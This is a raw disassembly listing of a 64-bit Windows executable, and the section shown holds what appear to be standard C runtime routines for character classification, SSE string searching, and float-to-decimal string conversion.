   14000f5e6:	83 3d 43 c6 00 00 00 	cmpl   $0x0,0xc643(%rip)        # 0x14001bc30
   14000f5ed:	48 63 d9             	movslq %ecx,%rbx
   14000f5f0:	75 10                	jne    0x14000f602
   14000f5f2:	48 8b 05 1f ab 00 00 	mov    0xab1f(%rip),%rax        # 0x14001a118
   14000f5f9:	0f b7 04 58          	movzwl (%rax,%rbx,2),%eax
   14000f5fd:	83 e0 04             	and    $0x4,%eax
   14000f600:	eb 52                	jmp    0x14000f654
   14000f602:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000f607:	33 d2                	xor    %edx,%edx
   14000f609:	e8 2e 59 ff ff       	call   0x140004f3c
   14000f60e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000f613:	83 b8 d4 00 00 00 01 	cmpl   $0x1,0xd4(%rax)
   14000f61a:	7e 15                	jle    0x14000f631
   14000f61c:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000f621:	ba 04 00 00 00       	mov    $0x4,%edx
   14000f626:	8b cb                	mov    %ebx,%ecx
   14000f628:	e8 97 d9 ff ff       	call   0x14000cfc4
   14000f62d:	8b c8                	mov    %eax,%ecx
   14000f62f:	eb 0e                	jmp    0x14000f63f
   14000f631:	48 8b 80 08 01 00 00 	mov    0x108(%rax),%rax
   14000f638:	0f b7 0c 58          	movzwl (%rax,%rbx,2),%ecx
   14000f63c:	83 e1 04             	and    $0x4,%ecx
   14000f63f:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000f644:	74 0c                	je     0x14000f652
   14000f646:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000f64b:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000f652:	8b c1                	mov    %ecx,%eax
   14000f654:	48 83 c4 40          	add    $0x40,%rsp
   14000f658:	5b                   	pop    %rbx
   14000f659:	c3                   	ret
   14000f65a:	cc                   	int3
   14000f65b:	cc                   	int3
   14000f65c:	48 83 ec 18          	sub    $0x18,%rsp
   14000f660:	45 33 c0             	xor    %r8d,%r8d
   14000f663:	4c 8b c9             	mov    %rcx,%r9
   14000f666:	85 d2                	test   %edx,%edx
   14000f668:	75 48                	jne    0x14000f6b2
   14000f66a:	41 83 e1 0f          	and    $0xf,%r9d
   14000f66e:	48 8b d1             	mov    %rcx,%rdx
   14000f671:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000f674:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   14000f678:	41 8b c9             	mov    %r9d,%ecx
   14000f67b:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000f67f:	41 d3 e1             	shl    %cl,%r9d
   14000f682:	66 0f 6f 02          	movdqa (%rdx),%xmm0
   14000f686:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000f68a:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000f68e:	41 23 c1             	and    %r9d,%eax
   14000f691:	75 14                	jne    0x14000f6a7
   14000f693:	48 83 c2 10          	add    $0x10,%rdx
   14000f697:	66 0f 6f 02          	movdqa (%rdx),%xmm0
   14000f69b:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000f69f:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000f6a3:	85 c0                	test   %eax,%eax
   14000f6a5:	74 ec                	je     0x14000f693
   14000f6a7:	0f bc c0             	bsf    %eax,%eax
   14000f6aa:	48 03 c2             	add    %rdx,%rax
   14000f6ad:	e9 a6 00 00 00       	jmp    0x14000f758
   14000f6b2:	83 3d 5b 99 00 00 02 	cmpl   $0x2,0x995b(%rip)        # 0x140019014
   14000f6b9:	0f 8d 9e 00 00 00    	jge    0x14000f75d
   14000f6bf:	4c 8b d1             	mov    %rcx,%r10
   14000f6c2:	0f b6 c2             	movzbl %dl,%eax
   14000f6c5:	41 83 e1 0f          	and    $0xf,%r9d
   14000f6c9:	49 83 e2 f0          	and    $0xfffffffffffffff0,%r10
   14000f6cd:	8b c8                	mov    %eax,%ecx
   14000f6cf:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000f6d2:	c1 e1 08             	shl    $0x8,%ecx
   14000f6d5:	0b c8                	or     %eax,%ecx
   14000f6d7:	66 0f 6e c1          	movd   %ecx,%xmm0
   14000f6db:	41 8b c9             	mov    %r9d,%ecx
   14000f6de:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000f6e2:	41 d3 e1             	shl    %cl,%r9d
   14000f6e5:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   14000f6ea:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   14000f6ee:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   14000f6f3:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   14000f6f8:	66 0f d7 c8          	pmovmskb %xmm0,%ecx
   14000f6fc:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   14000f700:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   14000f705:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   14000f709:	41 23 d1             	and    %r9d,%edx
   14000f70c:	41 23 c9             	and    %r9d,%ecx
   14000f70f:	75 2e                	jne    0x14000f73f
   14000f711:	0f bd ca             	bsr    %edx,%ecx
   14000f714:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000f718:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   14000f71c:	49 03 ca             	add    %r10,%rcx
   14000f71f:	85 d2                	test   %edx,%edx
   14000f721:	4c 0f 45 c1          	cmovne %rcx,%r8
   14000f725:	49 83 c2 10          	add    $0x10,%r10
   14000f729:	66 41 0f 74 0a       	pcmpeqb (%r10),%xmm1
   14000f72e:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   14000f733:	66 0f d7 c9          	pmovmskb %xmm1,%ecx
   14000f737:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   14000f73b:	85 c9                	test   %ecx,%ecx
   14000f73d:	74 d2                	je     0x14000f711
   14000f73f:	8b c1                	mov    %ecx,%eax
   14000f741:	f7 d8                	neg    %eax
   14000f743:	23 c1                	and    %ecx,%eax
   14000f745:	ff c8                	dec    %eax
   14000f747:	23 d0                	and    %eax,%edx
   14000f749:	0f bd ca             	bsr    %edx,%ecx
   14000f74c:	49 03 ca             	add    %r10,%rcx
   14000f74f:	85 d2                	test   %edx,%edx
   14000f751:	4c 0f 45 c1          	cmovne %rcx,%r8
   14000f755:	49 8b c0             	mov    %r8,%rax
   14000f758:	48 83 c4 18          	add    $0x18,%rsp
   14000f75c:	c3                   	ret
   14000f75d:	f6 c1 0f             	test   $0xf,%cl
   14000f760:	74 19                	je     0x14000f77b
   14000f762:	41 0f be 01          	movsbl (%r9),%eax
   14000f766:	3b c2                	cmp    %edx,%eax
   14000f768:	4d 0f 44 c1          	cmove  %r9,%r8
   14000f76c:	41 80 39 00          	cmpb   $0x0,(%r9)
   14000f770:	74 e3                	je     0x14000f755
   14000f772:	49 ff c1             	inc    %r9
   14000f775:	41 f6 c1 0f          	test   $0xf,%r9b
   14000f779:	75 e7                	jne    0x14000f762
   14000f77b:	0f b6 c2             	movzbl %dl,%eax
   14000f77e:	66 0f 6e c0          	movd   %eax,%xmm0
   14000f782:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   14000f789:	73 0d                	jae    0x14000f798
   14000f78b:	4c 63 c1             	movslq %ecx,%r8
   14000f78e:	4d 03 c1             	add    %r9,%r8
   14000f791:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   14000f798:	74 bb                	je     0x14000f755
   14000f79a:	49 83 c1 10          	add    $0x10,%r9
   14000f79e:	eb e2                	jmp    0x14000f782
   14000f7a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000f7a5:	57                   	push   %rdi
   14000f7a6:	48 83 ec 20          	sub    $0x20,%rsp
   14000f7aa:	48 8b d9             	mov    %rcx,%rbx
   14000f7ad:	49 8b 49 10          	mov    0x10(%r9),%rcx
   14000f7b1:	45 33 d2             	xor    %r10d,%r10d
   14000f7b4:	48 85 db             	test   %rbx,%rbx
   14000f7b7:	75 18                	jne    0x14000f7d1
   14000f7b9:	e8 ba 4d ff ff       	call   0x140004578
   14000f7be:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000f7c3:	89 18                	mov    %ebx,(%rax)
   14000f7c5:	e8 5e 49 ff ff       	call   0x140004128
   14000f7ca:	8b c3                	mov    %ebx,%eax
   14000f7cc:	e9 8f 00 00 00       	jmp    0x14000f860
   14000f7d1:	48 85 d2             	test   %rdx,%rdx
   14000f7d4:	74 e3                	je     0x14000f7b9
   14000f7d6:	41 8b c2             	mov    %r10d,%eax
   14000f7d9:	45 85 c0             	test   %r8d,%r8d
   14000f7dc:	44 88 13             	mov    %r10b,(%rbx)
   14000f7df:	41 0f 4f c0          	cmovg  %r8d,%eax
   14000f7e3:	ff c0                	inc    %eax
   14000f7e5:	48 98                	cltq
   14000f7e7:	48 3b d0             	cmp    %rax,%rdx
   14000f7ea:	77 0c                	ja     0x14000f7f8
   14000f7ec:	e8 87 4d ff ff       	call   0x140004578
   14000f7f1:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000f7f6:	eb cb                	jmp    0x14000f7c3
   14000f7f8:	48 8d 7b 01          	lea    0x1(%rbx),%rdi
   14000f7fc:	c6 03 30             	movb   $0x30,(%rbx)
   14000f7ff:	48 8b c7             	mov    %rdi,%rax
   14000f802:	eb 1a                	jmp    0x14000f81e
   14000f804:	44 38 11             	cmp    %r10b,(%rcx)
   14000f807:	74 08                	je     0x14000f811
   14000f809:	0f be 11             	movsbl (%rcx),%edx
   14000f80c:	48 ff c1             	inc    %rcx
   14000f80f:	eb 05                	jmp    0x14000f816
   14000f811:	ba 30 00 00 00       	mov    $0x30,%edx
   14000f816:	88 10                	mov    %dl,(%rax)
   14000f818:	48 ff c0             	inc    %rax
   14000f81b:	41 ff c8             	dec    %r8d
   14000f81e:	45 85 c0             	test   %r8d,%r8d
   14000f821:	7f e1                	jg     0x14000f804
   14000f823:	44 88 10             	mov    %r10b,(%rax)
   14000f826:	78 14                	js     0x14000f83c
   14000f828:	80 39 35             	cmpb   $0x35,(%rcx)
   14000f82b:	7c 0f                	jl     0x14000f83c
   14000f82d:	eb 03                	jmp    0x14000f832
   14000f82f:	c6 00 30             	movb   $0x30,(%rax)
   14000f832:	48 ff c8             	dec    %rax
   14000f835:	80 38 39             	cmpb   $0x39,(%rax)
   14000f838:	74 f5                	je     0x14000f82f
   14000f83a:	fe 00                	incb   (%rax)
   14000f83c:	80 3b 31             	cmpb   $0x31,(%rbx)
   14000f83f:	75 06                	jne    0x14000f847
   14000f841:	41 ff 41 04          	incl   0x4(%r9)
   14000f845:	eb 17                	jmp    0x14000f85e
   14000f847:	48 8b cf             	mov    %rdi,%rcx
   14000f84a:	e8 01 33 ff ff       	call   0x140002b50
   14000f84f:	48 8b d7             	mov    %rdi,%rdx
   14000f852:	48 8b cb             	mov    %rbx,%rcx
   14000f855:	4c 8d 40 01          	lea    0x1(%rax),%r8
   14000f859:	e8 c2 29 ff ff       	call   0x140002220
   14000f85e:	33 c0                	xor    %eax,%eax
   14000f860:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000f865:	48 83 c4 20          	add    $0x20,%rsp
   14000f869:	5f                   	pop    %rdi
   14000f86a:	c3                   	ret
   14000f86b:	cc                   	int3
   14000f86c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000f871:	44 0f b7 5a 06       	movzwl 0x6(%rdx),%r11d
   14000f876:	4c 8b d1             	mov    %rcx,%r10
   14000f879:	8b 4a 04             	mov    0x4(%rdx),%ecx
   14000f87c:	45 0f b7 c3          	movzwl %r11w,%r8d
   14000f880:	b8 00 80 00 00       	mov    $0x8000,%eax
   14000f885:	41 b9 ff 07 00 00    	mov    $0x7ff,%r9d
   14000f88b:	66 41 c1 e8 04       	shr    $0x4,%r8w
   14000f890:	66 44 23 d8          	and    %ax,%r11w
   14000f894:	8b 02                	mov    (%rdx),%eax
   14000f896:	66 45 23 c1          	and    %r9w,%r8w
   14000f89a:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
   14000f8a0:	bb 00 00 00 80       	mov    $0x80000000,%ebx
   14000f8a5:	41 0f b7 d0          	movzwl %r8w,%edx
   14000f8a9:	85 d2                	test   %edx,%edx
   14000f8ab:	74 18                	je     0x14000f8c5
   14000f8ad:	41 3b d1             	cmp    %r9d,%edx
   14000f8b0:	74 0b                	je     0x14000f8bd
   14000f8b2:	ba 00 3c 00 00       	mov    $0x3c00,%edx
   14000f8b7:	66 44 03 c2          	add    %dx,%r8w
   14000f8bb:	eb 24                	jmp    0x14000f8e1
   14000f8bd:	41 b8 ff 7f 00 00    	mov    $0x7fff,%r8d
   14000f8c3:	eb 1c                	jmp    0x14000f8e1
   14000f8c5:	85 c9                	test   %ecx,%ecx
   14000f8c7:	75 0d                	jne    0x14000f8d6
   14000f8c9:	85 c0                	test   %eax,%eax
   14000f8cb:	75 09                	jne    0x14000f8d6
   14000f8cd:	41 21 42 04          	and    %eax,0x4(%r10)
   14000f8d1:	41 21 02             	and    %eax,(%r10)
   14000f8d4:	eb 58                	jmp    0x14000f92e
   14000f8d6:	ba 01 3c 00 00       	mov    $0x3c01,%edx
   14000f8db:	66 44 03 c2          	add    %dx,%r8w
   14000f8df:	33 db                	xor    %ebx,%ebx
   14000f8e1:	44 8b c8             	mov    %eax,%r9d
   14000f8e4:	c1 e1 0b             	shl    $0xb,%ecx
   14000f8e7:	c1 e0 0b             	shl    $0xb,%eax
   14000f8ea:	41 c1 e9 15          	shr    $0x15,%r9d
   14000f8ee:	41 89 02             	mov    %eax,(%r10)
   14000f8f1:	44 0b c9             	or     %ecx,%r9d
   14000f8f4:	44 0b cb             	or     %ebx,%r9d
   14000f8f7:	45 89 4a 04          	mov    %r9d,0x4(%r10)
   14000f8fb:	45 85 c9             	test   %r9d,%r9d
   14000f8fe:	78 2a                	js     0x14000f92a
   14000f900:	41 8b 12             	mov    (%r10),%edx
   14000f903:	43 8d 04 09          	lea    (%r9,%r9,1),%eax
   14000f907:	8b ca                	mov    %edx,%ecx
   14000f909:	c1 e9 1f             	shr    $0x1f,%ecx
   14000f90c:	44 8b c9             	mov    %ecx,%r9d
   14000f90f:	44 0b c8             	or     %eax,%r9d
   14000f912:	8d 04 12             	lea    (%rdx,%rdx,1),%eax
   14000f915:	41 89 02             	mov    %eax,(%r10)
   14000f918:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000f91d:	66 44 03 c0          	add    %ax,%r8w
   14000f921:	45 85 c9             	test   %r9d,%r9d
   14000f924:	79 da                	jns    0x14000f900
   14000f926:	45 89 4a 04          	mov    %r9d,0x4(%r10)
   14000f92a:	66 45 0b d8          	or     %r8w,%r11w
   14000f92e:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000f933:	66 45 89 5a 08       	mov    %r11w,0x8(%r10)
   14000f938:	c3                   	ret
   14000f939:	cc                   	int3
   14000f93a:	cc                   	int3
   14000f93b:	cc                   	int3
   14000f93c:	40 55                	rex push %rbp
   14000f93e:	53                   	push   %rbx
   14000f93f:	56                   	push   %rsi
   14000f940:	57                   	push   %rdi
   14000f941:	48 8d 6c 24 c1       	lea    -0x3f(%rsp),%rbp
   14000f946:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000f94d:	48 8b 05 ac 96 00 00 	mov    0x96ac(%rip),%rax        # 0x140019000
   14000f954:	48 33 c4             	xor    %rsp,%rax
   14000f957:	48 89 45 27          	mov    %rax,0x27(%rbp)
   14000f95b:	48 8b fa             	mov    %rdx,%rdi
   14000f95e:	48 89 4d e7          	mov    %rcx,-0x19(%rbp)
   14000f962:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   14000f966:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   14000f96a:	49 8b d9             	mov    %r9,%rbx
   14000f96d:	49 8b f0             	mov    %r8,%rsi
   14000f970:	e8 f7 fe ff ff       	call   0x14000f86c
   14000f975:	0f b7 45 ff          	movzwl -0x1(%rbp),%eax
   14000f979:	45 33 c0             	xor    %r8d,%r8d
   14000f97c:	f2 0f 10 45 f7       	movsd  -0x9(%rbp),%xmm0
   14000f981:	f2 0f 11 45 e7       	movsd  %xmm0,-0x19(%rbp)
   14000f986:	4c 8d 4d 07          	lea    0x7(%rbp),%r9
   14000f98a:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   14000f98e:	41 8d 50 11          	lea    0x11(%r8),%edx
   14000f992:	66 89 45 ef          	mov    %ax,-0x11(%rbp)
   14000f996:	e8 59 00 00 00       	call   0x14000f9f4
   14000f99b:	0f be 4d 09          	movsbl 0x9(%rbp),%ecx
   14000f99f:	89 0f                	mov    %ecx,(%rdi)
   14000f9a1:	0f bf 4d 07          	movswl 0x7(%rbp),%ecx
   14000f9a5:	4c 8d 45 0b          	lea    0xb(%rbp),%r8
   14000f9a9:	89 4f 04             	mov    %ecx,0x4(%rdi)
   14000f9ac:	48 8b d3             	mov    %rbx,%rdx
   14000f9af:	48 8b ce             	mov    %rsi,%rcx
   14000f9b2:	89 47 08             	mov    %eax,0x8(%rdi)
   14000f9b5:	e8 92 84 ff ff       	call   0x140007e4c
   14000f9ba:	85 c0                	test   %eax,%eax
   14000f9bc:	75 1f                	jne    0x14000f9dd
   14000f9be:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   14000f9c2:	48 8b c7             	mov    %rdi,%rax
   14000f9c5:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000f9c9:	48 33 cc             	xor    %rsp,%rcx
   14000f9cc:	e8 6f 38 ff ff       	call   0x140003240
   14000f9d1:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000f9d8:	5f                   	pop    %rdi
   14000f9d9:	5e                   	pop    %rsi
   14000f9da:	5b                   	pop    %rbx
   14000f9db:	5d                   	pop    %rbp
   14000f9dc:	c3                   	ret
   14000f9dd:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000f9e3:	45 33 c9             	xor    %r9d,%r9d
   14000f9e6:	45 33 c0             	xor    %r8d,%r8d
   14000f9e9:	33 d2                	xor    %edx,%edx
   14000f9eb:	33 c9                	xor    %ecx,%ecx
   14000f9ed:	e8 56 47 ff ff       	call   0x140004148
   14000f9f2:	cc                   	int3
   14000f9f3:	cc                   	int3
   14000f9f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000f9f9:	55                   	push   %rbp
   14000f9fa:	56                   	push   %rsi
   14000f9fb:	57                   	push   %rdi
   14000f9fc:	41 54                	push   %r12
   14000f9fe:	41 55                	push   %r13
   14000fa00:	41 56                	push   %r14
   14000fa02:	41 57                	push   %r15
   14000fa04:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   14000fa09:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   14000fa10:	48 8b 05 e9 95 00 00 	mov    0x95e9(%rip),%rax        # 0x140019000
   14000fa17:	48 33 c4             	xor    %rsp,%rax
   14000fa1a:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000fa1e:	44 0f b7 51 08       	movzwl 0x8(%rcx),%r10d
   14000fa23:	49 8b d9             	mov    %r9,%rbx
   14000fa26:	44 8b 09             	mov    (%rcx),%r9d
   14000fa29:	89 55 b3             	mov    %edx,-0x4d(%rbp)
   14000fa2c:	ba 00 80 00 00       	mov    $0x8000,%edx
   14000fa31:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   14000fa37:	44 89 45 c7          	mov    %r8d,-0x39(%rbp)
   14000fa3b:	44 8b 41 04          	mov    0x4(%rcx),%r8d
   14000fa3f:	41 0f b7 ca          	movzwl %r10w,%ecx
   14000fa43:	66 23 ca             	and    %dx,%cx
   14000fa46:	44 8d 6a ff          	lea    -0x1(%rdx),%r13d
   14000fa4a:	41 8d 43 1f          	lea    0x1f(%r11),%eax
   14000fa4e:	45 33 e4             	xor    %r12d,%r12d
   14000fa51:	66 45 23 d5          	and    %r13w,%r10w
   14000fa55:	48 89 5d bf          	mov    %rbx,-0x41(%rbp)
   14000fa59:	c7 45 f7 cc cc cc cc 	movl   $0xcccccccc,-0x9(%rbp)
   14000fa60:	c7 45 fb cc cc cc cc 	movl   $0xcccccccc,-0x5(%rbp)
   14000fa67:	c7 45 ff cc cc fb 3f 	movl   $0x3ffbcccc,-0x1(%rbp)
   14000fa6e:	66 89 4d 99          	mov    %cx,-0x67(%rbp)
   14000fa72:	8d 78 0d             	lea    0xd(%rax),%edi
   14000fa75:	66 85 c9             	test   %cx,%cx
   14000fa78:	74 06                	je     0x14000fa80
   14000fa7a:	40 88 7b 02          	mov    %dil,0x2(%rbx)
   14000fa7e:	eb 03                	jmp    0x14000fa83
   14000fa80:	88 43 02             	mov    %al,0x2(%rbx)
   14000fa83:	66 45 85 d2          	test   %r10w,%r10w
   14000fa87:	75 2e                	jne    0x14000fab7
   14000fa89:	45 85 c0             	test   %r8d,%r8d
   14000fa8c:	0f 85 f4 00 00 00    	jne    0x14000fb86
   14000fa92:	45 85 c9             	test   %r9d,%r9d
   14000fa95:	0f 85 eb 00 00 00    	jne    0x14000fb86
   14000fa9b:	66 3b ca             	cmp    %dx,%cx
   14000fa9e:	0f 44 c7             	cmove  %edi,%eax
   14000faa1:	66 44 89 23          	mov    %r12w,(%rbx)
   14000faa5:	88 43 02             	mov    %al,0x2(%rbx)
   14000faa8:	66 c7 43 03 01 30    	movw   $0x3001,0x3(%rbx)
   14000faae:	44 88 63 05          	mov    %r12b,0x5(%rbx)
   14000fab2:	e9 5b 09 00 00       	jmp    0x140010412
   14000fab7:	66 45 3b d5          	cmp    %r13w,%r10w
   14000fabb:	0f 85 c5 00 00 00    	jne    0x14000fb86
   14000fac1:	be 00 00 00 80       	mov    $0x80000000,%esi
   14000fac6:	66 44 89 1b          	mov    %r11w,(%rbx)
   14000faca:	44 3b c6             	cmp    %esi,%r8d
   14000facd:	75 05                	jne    0x14000fad4
   14000facf:	45 85 c9             	test   %r9d,%r9d
   14000fad2:	74 29                	je     0x14000fafd
   14000fad4:	41 0f ba e0 1e       	bt     $0x1e,%r8d
   14000fad9:	72 22                	jb     0x14000fafd
   14000fadb:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000fadf:	4c 8d 05 ca 75 00 00 	lea    0x75ca(%rip),%r8        # 0x1400170b0
   14000fae6:	ba 16 00 00 00       	mov    $0x16,%edx
   14000faeb:	e8 5c 83 ff ff       	call   0x140007e4c
   14000faf0:	85 c0                	test   %eax,%eax
   14000faf2:	0f 84 82 00 00 00    	je     0x14000fb7a
   14000faf8:	e9 7b 09 00 00       	jmp    0x140010478
   14000fafd:	66 85 c9             	test   %cx,%cx
   14000fb00:	74 2b                	je     0x14000fb2d
   14000fb02:	41 81 f8 00 00 00 c0 	cmp    $0xc0000000,%r8d
   14000fb09:	75 22                	jne    0x14000fb2d
   14000fb0b:	45 85 c9             	test   %r9d,%r9d
   14000fb0e:	75 4d                	jne    0x14000fb5d
   14000fb10:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000fb14:	4c 8d 05 9d 75 00 00 	lea    0x759d(%rip),%r8        # 0x1400170b8
   14000fb1b:	41 8d 51 16          	lea    0x16(%r9),%edx
   14000fb1f:	e8 28 83 ff ff       	call   0x140007e4c
   14000fb24:	85 c0                	test   %eax,%eax
   14000fb26:	74 2b                	je     0x14000fb53
   14000fb28:	e9 60 09 00 00       	jmp    0x14001048d
   14000fb2d:	44 3b c6             	cmp    %esi,%r8d
   14000fb30:	75 2b                	jne    0x14000fb5d
   14000fb32:	45 85 c9             	test   %r9d,%r9d
   14000fb35:	75 26                	jne    0x14000fb5d
   14000fb37:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000fb3b:	4c 8d 05 7e 75 00 00 	lea    0x757e(%rip),%r8        # 0x1400170c0
   14000fb42:	41 8d 51 16          	lea    0x16(%r9),%edx
   14000fb46:	e8 01 83 ff ff       	call   0x140007e4c
   14000fb4b:	85 c0                	test   %eax,%eax
   14000fb4d:	0f 85 4f 09 00 00    	jne    0x1400104a2
   14000fb53:	b8 05 00 00 00       	mov    $0x5,%eax
   14000fb58:	88 43 03             	mov    %al,0x3(%rbx)
   14000fb5b:	eb 21                	jmp    0x14000fb7e
   14000fb5d:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000fb61:	4c 8d 05 60 75 00 00 	lea    0x7560(%rip),%r8        # 0x1400170c8
   14000fb68:	ba 16 00 00 00       	mov    $0x16,%edx
   14000fb6d:	e8 da 82 ff ff       	call   0x140007e4c
   14000fb72:	85 c0                	test   %eax,%eax
   14000fb74:	0f 85 3d 09 00 00    	jne    0x1400104b7
   14000fb7a:	c6 43 03 06          	movb   $0x6,0x3(%rbx)
   14000fb7e:	45 8b dc             	mov    %r12d,%r11d
   14000fb81:	e9 8c 08 00 00       	jmp    0x140010412
   14000fb86:	41 0f b7 d2          	movzwl %r10w,%edx
   14000fb8a:	44 89 4d e9          	mov    %r9d,-0x17(%rbp)
   14000fb8e:	66 44 89 55 f1       	mov    %r10w,-0xf(%rbp)
   14000fb93:	41 8b c8             	mov    %r8d,%ecx
   14000fb96:	8b c2                	mov    %edx,%eax
   14000fb98:	4c 8d 0d 51 a8 00 00 	lea    0xa851(%rip),%r9        # 0x14001a3f0
   14000fb9f:	c1 e9 18             	shr    $0x18,%ecx
   14000fba2:	c1 e8 08             	shr    $0x8,%eax
   14000fba5:	41 bf 00 00 00 80    	mov    $0x80000000,%r15d
   14000fbab:	8d 04 48             	lea    (%rax,%rcx,2),%eax
   14000fbae:	41 be 05 00 00 00    	mov    $0x5,%r14d
   14000fbb4:	49 83 e9 60          	sub    $0x60,%r9
   14000fbb8:	44 89 45 ed          	mov    %r8d,-0x13(%rbp)
   14000fbbc:	66 44 89 65 e7       	mov    %r12w,-0x19(%rbp)
   14000fbc1:	be fd bf 00 00       	mov    $0xbffd,%esi
   14000fbc6:	6b c8 4d             	imul   $0x4d,%eax,%ecx
   14000fbc9:	69 c2 10 4d 00 00    	imul   $0x4d10,%edx,%eax
   14000fbcf:	05 0c ed bc ec       	add    $0xecbced0c,%eax
   14000fbd4:	44 89 75 b7          	mov    %r14d,-0x49(%rbp)
   14000fbd8:	41 8d 7f ff          	lea    -0x1(%r15),%edi
   14000fbdc:	03 c8                	add    %eax,%ecx
   14000fbde:	c1 f9 10             	sar    $0x10,%ecx
   14000fbe1:	44 0f bf d1          	movswl %cx,%r10d
   14000fbe5:	89 4d 9f             	mov    %ecx,-0x61(%rbp)
   14000fbe8:	41 f7 da             	neg    %r10d
   14000fbeb:	0f 84 6f 03 00 00    	je     0x14000ff60
   14000fbf1:	45 85 d2             	test   %r10d,%r10d
   14000fbf4:	79 11                	jns    0x14000fc07
   14000fbf6:	4c 8d 0d 53 a9 00 00 	lea    0xa953(%rip),%r9        # 0x14001a550
   14000fbfd:	41 f7 da             	neg    %r10d
   14000fc00:	49 83 e9 60          	sub    $0x60,%r9
   14000fc04:	45 85 d2             	test   %r10d,%r10d
   14000fc07:	0f 84 53 03 00 00    	je     0x14000ff60
   14000fc0d:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   14000fc11:	8b 55 e7             	mov    -0x19(%rbp),%edx
   14000fc14:	41 8b c2             	mov    %r10d,%eax
   14000fc17:	49 83 c1 54          	add    $0x54,%r9
   14000fc1b:	41 c1 fa 03          	sar    $0x3,%r10d
   14000fc1f:	44 89 55 af          	mov    %r10d,-0x51(%rbp)
   14000fc23:	4c 89 4d a7          	mov    %r9,-0x59(%rbp)
   14000fc27:	83 e0 07             	and    $0x7,%eax
   14000fc2a:	0f 84 19 03 00 00    	je     0x14000ff49
   14000fc30:	48 98                	cltq
   14000fc32:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   14000fc36:	49 8d 34 89          	lea    (%r9,%rcx,4),%rsi
   14000fc3a:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000fc40:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   14000fc44:	66 44 39 0e          	cmp    %r9w,(%rsi)
   14000fc48:	72 25                	jb     0x14000fc6f
   14000fc4a:	8b 46 08             	mov    0x8(%rsi),%eax
   14000fc4d:	f2 0f 10 06          	movsd  (%rsi),%xmm0
   14000fc51:	48 8d 75 07          	lea    0x7(%rbp),%rsi
   14000fc55:	89 45 0f             	mov    %eax,0xf(%rbp)
   14000fc58:	f2 0f 11 45 07       	movsd  %xmm0,0x7(%rbp)
   14000fc5d:	48 8b 45 07          	mov    0x7(%rbp),%rax
   14000fc61:	48 c1 e8 10          	shr    $0x10,%rax
   14000fc65:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   14000fc69:	41 2b c3             	sub    %r11d,%eax
   14000fc6c:	89 45 09             	mov    %eax,0x9(%rbp)
   14000fc6f:	0f b7 4e 0a          	movzwl 0xa(%rsi),%ecx
   14000fc73:	0f b7 45 f1          	movzwl -0xf(%rbp),%eax
   14000fc77:	44 89 65 9b          	mov    %r12d,-0x65(%rbp)
   14000fc7b:	0f b7 d9             	movzwl %cx,%ebx
   14000fc7e:	66 41 23 cd          	and    %r13w,%cx
   14000fc82:	48 c7 45 d7 00 00 00 	movq   $0x0,-0x29(%rbp)
   14000fc89:	00 
   14000fc8a:	66 33 d8             	xor    %ax,%bx
   14000fc8d:	66 41 23 c5          	and    %r13w,%ax
   14000fc91:	44 89 65 df          	mov    %r12d,-0x21(%rbp)
   14000fc95:	66 41 23 d9          	and    %r9w,%bx
